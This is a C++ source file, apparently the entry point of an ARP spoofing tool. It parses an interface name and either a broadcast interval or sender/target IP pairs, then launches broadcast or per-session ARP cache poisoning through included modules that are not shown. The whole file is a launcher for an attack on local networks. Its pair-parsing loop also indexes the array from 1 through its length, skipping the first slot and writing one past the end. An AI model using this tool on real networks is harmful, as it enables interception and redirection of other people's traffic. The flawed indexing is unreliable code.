#include <iostream>
#include <vector>
#include "network/FormatTools.cpp"
#include "network/NetFuncs.cpp"
#include "network/arp/SessionARPSpoofing.cpp"
#include "network/arp/BroadcastARPSpoofing.cpp"

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cout << "WARNING: failed load network protocol..." << std::endl;
        return 1;
    } else std::cout << "INFO: network interface at " << argv[1] << std::endl;

    BaseARPSpoofing* arpSpoofingManager;

    if (argc < 4) {
        std::cout << "INFO: broadcast arp-spoofing..." << std::endl;
        int sendFeq = 2;
        if (argc == 3) {
            auto vSendFeq = FormatTools::strToInt(argv[2]);
            if (vSendFeq) sendFeq = vSendFeq.value();
            else std::cout << "WARNING: invalid nature number: " << argv[2] << std::endl;
        }
        std::cout << "INFO: broadcast feq set at " << sendFeq << " seconds" << std::endl;

        arpSpoofingManager = new BroadcastARPSpoofing(argv[1], sendFeq);
    } else {
        int pair_count = argc / 2 - 1;
        std::cout << "INFO: total session: " << pair_count << std::endl;
        auto pairs = new std::pair<uint8_t *, uint8_t *>[pair_count]();
        for (int i = 1; pair_count + 1 > i; i++) {
            auto senderIP = FormatTools::strToIP(argv[i * 2]);
            auto targetIp = FormatTools::strToIP(argv[i * 2 + 1]);
            if (!senderIP or !targetIp) {
                std::cout << "ERROR: invalid session pair: " << argv[i * 2] << " <=> " << argv[i * 2 + 1]
                          << std::endl;
                return 1;
            }
            std::cout << "INFO: success parse session: " << argv[i * 2] << "<=>" << argv[i * 2 + 1] << std::endl;
            pairs[i] = std::make_pair(senderIP.value(), targetIp.value());
        }

        arpSpoofingManager = new SessionARPSpoofing(argv[1], pairs);
    }

    std::cout << "INFO: start arp-spoofing" << std::endl;

    arpSpoofingManager->buildPCAPHandle();
    arpSpoofingManager->startARPSpoofing(10);

    std::cout << "INFO: end arp-spoofing; timeout." << std::endl;
    return 0;
}
